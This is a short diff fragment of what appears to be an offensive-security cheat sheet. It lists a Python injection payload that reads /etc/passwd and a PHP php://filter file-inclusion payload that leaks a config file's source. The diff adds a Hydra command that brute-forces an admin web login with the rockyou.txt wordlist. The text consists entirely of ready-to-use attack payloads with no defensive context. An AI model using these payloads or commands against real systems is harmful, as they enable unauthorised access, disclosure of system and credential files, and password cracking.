@@ -8,3 +8,7 @@ __import__("os").system('cat /etc/passwd')
 PHP:
 fetching source files : 
 index.php?file=php://filter/convert.base64-encode/resource=config 
+
+Hydra:
+hydra -s 45885 -l admin www.bruteforce.me -P rockyou.txt http-form-post "/:password=^PASS^:F=Invalid"
+
